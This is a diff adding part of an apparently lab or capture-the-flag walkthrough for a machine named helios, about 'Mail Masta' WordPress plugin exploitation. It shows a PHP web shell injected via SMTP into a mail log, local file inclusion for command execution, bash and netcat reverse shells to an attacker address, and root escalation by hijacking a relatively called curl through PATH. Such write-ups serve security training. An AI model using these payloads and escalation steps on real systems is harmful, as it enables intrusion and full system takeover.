@@ -175,10 +175,109 @@ http://192.168.1.206/h3l105//wp-content/plugins/mail-masta/inc/campaign/count_of
 ![image](https://github.com/user-attachments/assets/84b33dfc-d780-4c30-8a82-75c6e1dcadbc)
 ![image](https://github.com/user-attachments/assets/bdd37c8d-0aa0-4f20-ab91-0d646b1a980d)
 
+#### **Just remenber Port 25 is used to send and receive emails between email servers. It is the default port for email transfer.**
+![image](https://github.com/user-attachments/assets/23103b38-8399-4db1-861c-deab7a34ba51)
 
+#### **we will try to send an email to helios**
+```bash
+telnet 192.168.1.206 25
+```
+```bash
+MAIL FROM: LOEST
+RCPT TO: helios
+DATA
+<?php system($_GET['cmd']); ?>
+.
+```
+![image](https://github.com/user-attachments/assets/890a280a-df54-49d0-9af5-135df9029354)
+![image](https://github.com/user-attachments/assets/cacfb6a8-0118-4f65-8d70-150b63cecf8c)
 
+```bash
+curl -s -X GET "http://192.168.1.206/h3l105//wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=whoami"
+```
+![image](https://github.com/user-attachments/assets/a56fad4b-bcac-422a-a1b5-7ad69b1e2939)
+![image](https://github.com/user-attachments/assets/3d5d7cbf-837a-41a3-ad4a-ae024b175625)
 
+```bash
+bash -c "bash -i >%26 /dev/tcp/192.168.1.228/444 0>%261"
+```
+```bash
+nc -nlvp 443
+```
+```bash
+curl -s -X GET "http://192.168.1.206/h3l105//wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=nc+-e+/bin/bash+192.168.1.188+443"
+```
+![image](https://github.com/user-attachments/assets/6153ada7-9dfe-4ea8-9392-932e9dc7627f)
+![image](https://github.com/user-attachments/assets/9f1bafc6-18dd-436d-b047-6a894c8801f7)
 
+```bash
+script /dev/null -c bash
+"CTRL+Z"
+stty raw -echo; fg
+reset xterm
+export TERM=xterm
+export SHELL=bash
+ stty rows 61 columns 126
+```
+![image](https://github.com/user-attachments/assets/0f23bafd-d194-40fa-b298-26c8c744fc1c)
+
+```bash
+find / -perm -4000 2>/dev/null
+```
+![image](https://github.com/user-attachments/assets/7f54c616-6213-4a6f-902c-992a7513fb5e)
+
+```bash
+file /opt/statuscheck
+```
+![image](https://github.com/user-attachments/assets/5e7f9667-4b86-4bbd-8d91-38b7892e6197)
+
+```bash
+./opt/statuscheck
+```
+![image](https://github.com/user-attachments/assets/fef00c83-90ae-4d66-ab67-c521305352cc)
+
+```bash
+strings statuscheck | less
+```
+![image](https://github.com/user-attachments/assets/7d59aabc-065f-4ea0-b353-1e8685c54702)
+
+#### **CURL is being executed in a relative way and not in an absolute way, so we could hijack it.**
+#### **now we will create a new CURL file and add it to the pad so that it has priority and when we execute the statuscheck file it will call our curl.**
+
+```bash
+touch curl
+```
+```bash
+chmod +x curl
+```
+![image](https://github.com/user-attachments/assets/262a5fb8-2d3a-4632-8ffc-70ccc4925e6c)
+
+#### **we will modify our file so that when we run it our bash will become root**
+```bash
+chmod u+s /bin/bash
+```
+#### **we will prioritize our curl by adding it to the PATH**
+
+```bash
+export PATH=.:$PATH
+```
+```bash
+echo $PATH
+```
+![image](https://github.com/user-attachments/assets/35dc4f2b-092d-4c90-988a-76cb2bc3fd85)
+
+```bash
+/opt/statuscheck
+```
+```bash
+ls -l /bin/bash
+```
+![image](https://github.com/user-attachments/assets/5a62f694-b1c7-4c8e-ab36-6645dcc7c70c)
+
+```bash
+bash -p
+```
+![image](https://github.com/user-attachments/assets/528ab289-6891-4e35-96ab-a2b5ce1b25e0)
 
 
 
